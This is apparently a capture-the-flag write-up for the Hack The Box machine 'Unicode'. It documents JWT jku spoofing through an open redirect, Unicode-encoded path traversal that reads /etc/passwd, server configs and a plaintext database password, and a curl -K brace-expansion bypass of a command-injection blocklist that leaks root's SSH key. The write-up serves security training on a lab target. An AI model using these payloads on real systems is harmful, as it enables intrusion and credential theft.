# Unicode

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.246.167
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 08:22 EDT
Nmap scan report for 10.129.246.167
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Hackmedia JKU Spoofing

The website was a corporate page for a threat analytics company:

<figure><img src="../../../.gitbook/assets/image (2028).png" alt=""><figcaption></figcaption></figure>

If we click `Google about us`, it redirects us using this URL:

```
http://10.129.246.167/redirect/?url=google.com
```

This might be vulnerable to SSRF, but let's first add `hackmedia.htb` to our `/etc/hosts` file and register a user on the site. Upon accessing the dashboard, we see that we have a few functions:

<figure><img src="../../../.gitbook/assets/image (1940).png" alt=""><figcaption></figcaption></figure>

When the request is viewed in Burp, we can see it uses a JWT token:

{% code overflow="wrap" %}
```http
GET /dashboard/ HTTP/1.1
Host: 10.129.246.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.246.167/login/
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoidGVzdDEyMyJ9.GH9NHOQuud4tOr1Ax-Gaavfnkae2D0qqjFet8bXweBQdF7xs7zKlHPQuw0p00BP7zc9zaRwdtTr7XLvdK2qnG9YRdd0Qi6asBs15OzPz32qrIcIatLMSyGoEE-UTSg9WrnKkx7OHrIAChGc2PXY0EaoViN9nUhpezUDIZ1JIvIIE_6WkGxEJlETCHJjXX8nxHMEwAJlk1W9tAEVusHPcSBB3m-uFGjxS8IVOshNPDFrm_YMS8Q0fJrzSevCTOew0pf8pC5CZodLB-iHTMQlbdD3mBDMrsPt5bbQqX5UGBXsq7Q10QzJ9PDUrYLiLyzfDxKdzMg_bIPBfp58I8K_A7g
Upgrade-Insecure-Requests: 1

```
{% endcode %}

When decoded on [jwt.io](https://jwt.io/), we can see that it contains the username field and is signed via RSA.

<figure><img src="../../../.gitbook/assets/image (1903).png" alt=""><figcaption></figcaption></figure>

Interesting! There's also a `jku` field with a URL to the site. When viewed, it appears to contain the public key of the JWT token:

```
$ curl http://hackmedia.htb/static/jwks.json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}  
```

When researching for exploits pertaining to `jku`, I came across this:

{% embed url="https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c" %}

Basically, the exploit requires us to generate a private-public key pair, and use that to spoof tokens after replacing the `jku` parameter with a URL to our machine's own `jwk.json` file. So first, we need to generate a key pair:

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

Afterwards, we can head back to jwt.io and create a new token with a new URL. Since there's a `redirect` functionality available, I'll just use that to make it request the `jwks.json` file to our machine. Then, we can also change the username to `admin`.&#x20;

<figure><img src="../../../.gitbook/assets/image (3708).png" alt=""><figcaption></figcaption></figure>

Then we need to create the `jwks.json` file. This can be done by first downloading the format from the machine, and then replacing the values in it with our own key pair's.&#x20;

```
$ openssl rsa -in publickey.crt -pubin -text -noout             
Public-Key: (2048 bit)
Modulus:
    00:c4:2e:63:41:93:eb:5b:6a:bf:6e:a9:41:8b:5f:
    ec:28:35:f1:c3:50:b3:dc:21:40:43:06:6b:f0:ca:
    d4:8a:03:9f:73:a4:75:79:6a:f6:0d:53:d0:7c:d1:
    21:d4:cc:fd:5d:bf:4d:7b:ac:28:c6:e1:a9:c3:97:
    4b:9f:46:7f:52:de:33:a7:27:e8:e2:eb:67:07:56:
    b2:99:94:58:c5:02:9c:c6:de:cf:8f:12:b5:3b:51:
    02:9a:5e:7a:98:cc:83:1c:20:67:8d:c3:e6:8a:92:
    ce:23:47:f3:6b:0b:7a:73:0b:a8:8e:d9:36:97:09:
    00:86:3e:9e:c9:97:b1:be:17:76:28:3e:1a:31:b2:
    a8:b6:8f:26:0a:2f:ae:14:65:d8:87:c4:6b:6d:49:
    40:4d:3a:fb:10:c3:b8:9d:33:80:8e:e4:71:97:f3:
    26:85:33:8c:6e:79:e3:61:7b:66:ae:c3:dc:ee:78:
    f1:3f:1c:3a:e4:75:fe:0f:ca:15:d2:9a:4a:0d:8d:
    78:6f:0a:ae:a6:00:ea:9c:59:59:2a:ad:3b:74:eb:
    29:46:65:44:63:7d:38:8a:51:5d:fa:95:54:c0:2e:
    56:04:b1:89:b2:af:6e:99:7b:e3:51:b4:1a:00:0c:
    e2:c0:e8:ae:c2:ac:6b:d3:f5:ab:88:26:28:c4:95:
    b4:8b
Exponent: 65537 (0x10001)
```

Take the hex part and convert it to text, and then `base64` it.&#x20;

```
$ cat num| xxd -r -p |base64                            
AMQuY0GT61tqv26pQYtf7Cg18cNQs9whQEMGa/DK1IoDn3OkdXlq9g1T0HzRIdTM/V2/TXusKMbh
qcOXS59Gf1LeM6cn6OLrZwdWspmUWMUCnMbez48StTtRAppeepjMgxwgZ43D5oqSziNH82sLenML
qI7ZNpcJAIY+nsmXsb4Xdig+GjGyqLaPJgovrhRl2IfEa21JQE06+xDDuJ0zgI7kcZfzJoUzjG55
42F7Zq7D3O548T8cOuR1/g/KFdKaSg2NeG8KrqYA6pxZWSqtO3TrKUZlRGN9OIpRXfqVVMAuVgSx
ibKvbpl741G0GgAM4sDorsKsa9P1q4gmKMSVtIs=
```

When we refresh the page, we get a hit on our HTTP server for the `jwks.json` file and that the dashboard is different:

<figure><img src="../../../.gitbook/assets/image (3261).png" alt=""><figcaption></figcaption></figure>

### Unicode LFI

Under the Saved Reports portion, when we try to view a few files, we are redirected to this site:

```
http://10.129.246.167/display/?page=monthly.pdf
```

This looks vulnerable to LFI, so I tried to view the `/etc/passwd` file but it didn't work.

<figure><img src="../../../.gitbook/assets/image (2389).png" alt=""><figcaption></figcaption></figure>

Looks like it isn't processing. Now because this box was literally named Unicode, we might have to use Unicode characters to make this work. When we use this payload, the LFI works:

```
http://10.129.246.167/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd
```

<figure><img src="../../../.gitbook/assets/image (2747).png" alt=""><figcaption></figcaption></figure>

Now with an LFI, let's try to read the `nginx` configuration files since this was an Nginx server.&#x20;

```bash
$ curl -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjEzL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.BTblX6M82Za_sh8hvEuUHdrArVmK-zLFphwUfpEB9Vuib6dfiZ5_RXqZYwmI-uo1NSl-pKXxB6shhB57oFG2pSH5AjU6Cxk6HqvgTBMNIdFjaoGdj4uyq3FgYuH8VN8PxUMXhf6MwkpBrd-hh-yJ32xRFV-Z_uIqTc1Rue5ImLvTVAQ1434ZUjCkKzsMUKPa-PI8pXLWmR2MGpvRBbUd7xSth2tVOpgnK9u0h09xh-2kE3YjopdxeNAfokXJUshfL5tUX_BTHY0-10KvDb3amfWTGUoRruyUSTdWm5-H1PAtbvOJ3-Uo_EkwVPIbwEr3g51yR-ZvAMfLkInG-LQNiw' http://10.129.246.167/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/nginx/sites-available/default
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s;

server{
#Change the Webroot from /home/code/app/ to /var/www/html/
#change the user password from db.yaml
        listen 80;
        error_page 503 /rate-limited/;
        location / {
                limit_req zone=mylimit;
                proxy_pass http://localhost:8000;
                include /etc/nginx/proxy_params;
                proxy_redirect off;
        }
        location /static/{
                alias /home/code/coder/static/styles/;
        }
}
```

`db.yaml`? This is located within `/home/code/coder/db.yaml`.&#x20;

```bash
$ curl -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjEzL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.BTblX6M82Za_sh8hvEuUHdrArVmK-zLFphwUfpEB9Vuib6dfiZ5_RXqZYwmI-uo1NSl-pKXxB6shhB57oFG2pSH5AjU6Cxk6HqvgTBMNIdFjaoGdj4uyq3FgYuH8VN8PxUMXhf6MwkpBrd-hh-yJ32xRFV-Z_uIqTc1Rue5ImLvTVAQ1434ZUjCkKzsMUKPa-PI8pXLWmR2MGpvRBbUd7xSth2tVOpgnK9u0h09xh-2kE3YjopdxeNAfokXJUshfL5tUX_BTHY0-10KvDb3amfWTGUoRruyUSTdWm5-H1PAtbvOJ3-Uo_EkwVPIbwEr3g51yR-ZvAMfLkInG-LQNiw' http://10.129.246.167/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/home/code/coder/db.yaml
mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"
```

Using this password, we can login as `code` using `ssh`.&#x20;

<figure><img src="../../../.gitbook/assets/image (869).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Treport

When checking `sudo` privileges, we find that we can run `treport` as `root`.

```
code@code:~$ sudo -l
Matching Defaults entries for code on code:                                                  
    env_reset, mail_badpass,                                                                 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
                                                                                             
User code may run the following commands on code:                                            
    (root) NOPASSWD: /usr/bin/treport
```

Running a quick `file` and `strings` reveals this is a compiled Python script.

{% code overflow="wrap" %}
```
code@code:~$ file /usr/bin/treport
/usr/bin/treport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f6af5bc244c001328c174a6abf855d682aa7401b, for GNU/Linux 2.6.32, stripped

code@code:~$ strings /usr/bin/treport
<TRUNCATED>
blib-dynload/_asyncio.cpython-38-x86_64-linux-gnu.so
blib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so
blib-dynload/_codecs_cn.cpython-38-x86_64-linux-gnu.so
blib-dynload/_codecs_hk.cpython-38-x86_64-linux-gnu.so
<TRUNCATED>
```
{% endcode %}

So we can download this binary back to our machine for reverse engineering. First, we can use `pyinstxtractor` to convert this to bytecode, and then `pycdc` to convert it to a script.&#x20;

```bash
pyinstxtractor treport
cd treport_extracted
pycdc treport.pyc > script.py
```

Here's the contents of the script:

```python
# Source Generated with Decompyle++
# File: treport.pyc (Python 3.8)

import os
import sys
from datetime import datetime
import re

class threat_report:
    
    def create(self):
        file_name = input('Enter the filename:')
        content = input('Enter the report:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        file_path = '/root/reports/' + file_name
    # WARNING: Decompyle incomplete

    
    def list_files(self):
        file_list = os.listdir('/root/reports/')
        files_in_dir = ' '.join((lambda .0: [ str(elem) for elem in .0 ])(file_list))
        print('ALL THE THREAT REPORTS:')
        print(files_in_dir)

    
    def read_file(self):
        file_name = input('\nEnter the filename:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        contents = ''
        file_name = '/root/reports/' + file_name
    # WARNING: Decompyle incomplete

    
    def download(self):
        now = datetime.now()
        current_time = now.strftime('%H_%M_%S')
        command_injection_list = [
            '$',
            '`',
            ';',
            '&',
            '|',
            '||',
            '>',
            '<',
            '?',
            "'",
            '@',
            '#',
            '$',
            '%',
            '^',
            '(',
            ')']
        ip = input('Enter the IP/file_name:')
        res = bool(re.search('\\s', ip))
        if res:
            print('INVALID IP')
            sys.exit(0)
        if 'file' in ip and 'gopher' in ip or 'mysql' in ip:
            print('INVALID URL')
            sys.exit(0)
        for vars in command_injection_list:
            if vars in ip:
                print('NOT ALLOWED')
                sys.exit(0)
                continue
                cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
                os.system(cmd)
                return None


if __name__ == '__main__':
    obj = threat_report()
    print('1.Create Threat Report.')
    print('2.Read Threat Report.')
    print('3.Download A Threat Report.')
    print('4.Quit.')
    check = True
    if check:
        choice = input('Enter your choice:')
        
        try:
            choice = int(choice)
        finally:
            pass
        print('Wrong Input')
        sys.exit(0)
        if choice == 1:
            obj.create()
            continue

        if choice == 2:
            obj.list_files()
            obj.read_file()
            continue
        if choice == 3:
            obj.download()
            continue
        if choice == 4:
            check = False
            continue
        print('Wrong input.')
        continue
```

There's a possible Command Injection point here:

```python
vfor vars in command_injection_list:
            if vars in ip:
                print('NOT ALLOWED')
                sys.exit(0)
                continue
                cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
                os.system(cmd)
                return None
```

The `ip` variable is passed into a shell command, and it uses `curl`. However, there is a check for bad characters and it covers all of them. In this case, we can use the `-K` flag from `curl`, which would allow us to specify configurations for it. Furthermore, the `{` character has not been whitelisted, allowing us to abuse Brace Expansion.

{% embed url="https://linuxhandbook.com/brace-expansion/" %}

We can use this to read files like the `id_rsa` of root.&#x20;

<figure><img src="../../../.gitbook/assets/image (3765).png" alt=""><figcaption></figcaption></figure>

We can transfer this to our machine and begin to convert it to the correct format and then use it to `ssh` in as `root`. I admit, I got a bit lazy and just read the root flag.&#x20;
